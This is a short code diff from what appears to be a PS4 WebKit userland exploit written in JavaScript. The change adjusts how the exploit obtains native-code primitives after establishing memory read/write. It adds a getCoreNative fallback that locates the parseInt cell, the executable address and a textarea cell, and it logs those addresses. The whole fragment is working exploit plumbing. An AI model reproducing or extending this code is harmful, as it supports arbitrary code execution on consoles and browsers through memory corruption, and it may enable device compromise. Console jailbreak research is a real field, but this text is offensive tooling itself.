@@ -2,7 +2,7 @@
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
-import { establishPrimitive, trimExploitDebris } from "./core.js";
+import { establishPrimitive, trimExploitDebris, getCoreNative } from "./core.js?v=core-2";
 import {
     prepCoreNative, fireCoreSmoke, fireCoreGetpid, bisectCoreTriggerLite,
 } from "./core_native.js";
@@ -55,6 +55,10 @@ async function runStart() {
         });
         installWindowP(carrier, { promote: false });
         window._wkCarrier = carrier;
+        if (!carrier.native) {
+            const nat = getCoreNative(carrier);
+            if (nat) carrier.native = nat;
+        }
         const p = window.p;
         if (!p) throw new Error("no p");
         try { trimExploitDebris(); } catch (_) { }
@@ -62,7 +66,8 @@ async function runStart() {
 
         const off = offsetsFor(navigator.userAgent).off;
         prep = prepCoreNative(p, off, carrier);
-        const nat = carrier.native;
+        const nat = getCoreNative(carrier);
+        if (!nat) throw new Error("parseInt anchors missing — reload with ?v=core-2");
         log("CORE-NATIVE", "parseInt cell=0x" + (nat.targetCell || 0).toString(16)
             + " exec=0x" + (nat.executable || 0).toString(16)
             + " ta=0x" + (nat.textareaCell || 0).toString(16));
